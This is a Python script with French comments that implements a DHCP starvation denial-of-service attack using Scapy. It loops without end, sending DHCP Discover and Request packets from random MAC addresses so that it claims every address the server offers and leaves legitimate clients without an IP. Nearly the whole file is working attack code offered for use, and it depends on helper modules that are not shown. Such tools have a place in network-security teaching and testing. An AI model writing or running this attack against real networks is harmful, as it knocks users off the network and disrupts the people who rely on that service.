#!/usr/bin/python3.5
# -*- coding=utf-8 -*-

#DHCP Starvation
#Si le serveur propose un pool d’adresse de 254 IP et que l’on effectue 254 demandes sur une très courte période, il va nous proposer ces 254 IP et les mettre en attente de confirmation. 
#Si un client légitime arrive sur le réseau à ce moment-là, il ne pourra avoir d’IP car le serveur DHCP aura déjà proposé les 254 IP qu’il pouvait distribuer, on parle alors de “famine“, ou plus généralement de DHCP Starvation, il s’agit bien là d’une attaque de type Déni se service (DOS) car le serveur DHCP ne remplit plus du tout son rôle.
#L’attaque par DHCP Starvation, un terme qui peut plus ou moins maladroitement se traduire par “famine“, va donc avoir pour but d’effectuer un déni de service au niveau du service DHCP d’un réseau.

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)#Ignorer l'erreur de IPv6 lors l'utilisation de Scapy
from scapy.all import *
import multiprocessing
import struct
import optparse
from Change_MAC_To_Bytes import Change_MAC_To_Bytes
from GET_MAC import GET_MAC
from Change_Chaddr_To_MAC import Change_Chaddr_To_MAC
from Random_MAC import Random_MAC
from DHCP_Discover import DHCP_Discover_Sendonly
from DHCP_Request import DHCP_Request_Sendonly

def DHCP_Monitor_Control(pkt):
	try:		
		if pkt.getlayer(DHCP).fields['options'][0][1]== 2:#DHCP OFFER
			options = {}
			MAC_Bytes = pkt.getlayer(BOOTP).fields['chaddr']
			MAC_ADDR = Change_Chaddr_To_MAC(MAC_Bytes)
			options['MAC'] = MAC_ADDR
			options['client_id'] = Change_MAC_To_Bytes(MAC_ADDR)
			options['requested_addr'] = pkt.getlayer(BOOTP).fields['yiaddr']
			for i in pkt.getlayer(DHCP).fields['options']:
				if i[0] == 'server_id' :
					options['Server_IP'] = i[1]
			Send_Request = multiprocessing.Process(target=DHCP_Request_Sendonly, args=(Global_IF,options))
			Send_Request.start()

	except Exception as e:   
		print(e)
		pass

def DHCP_FULL_ONE(ifname, MAC, timeout = 5):
	#DHCP une fois
	Send_Discover = multiprocessing.Process(target=DHCP_Discover_Sendonly, args=(Global_IF,MAC))
	Send_Discover.start()
	sniff(prn=DHCP_Monitor_Control, filter="port 68 and port 67", store=0, iface=Global_IF, timeout = timeout)
	#On reçoit DHCP OFFER，puis on envoit DHCP Request

def DHCP_DoS(ifname):
	global Global_IF
	Global_IF = ifname
	while True:
		#Une boucle attaque DHCP
		DHCP_FULL_DOS = multiprocessing.Process(target=DHCP_FULL_ONE, args=(ifname,Random_MAC()))
		DHCP_FULL_DOS.start()


#Définissons des options
if __name__ == "__main__":
	#Example 
    parser = optparse.OptionParser('python3 DHCP_DOS.py --i interface')
    parser.add_option('-i', dest = 'ifname', type = 'string', help = 'interface')
    (options, args) = parser.parse_args()
    ifname = options.ifname
    #Si la commande est sans option, on affiche l'example
    if ifname == None:
        print(parser.usage)
    else:
    	#On effectue la fonction et affiche le résultat 
        DHCP_DoS(ifname)
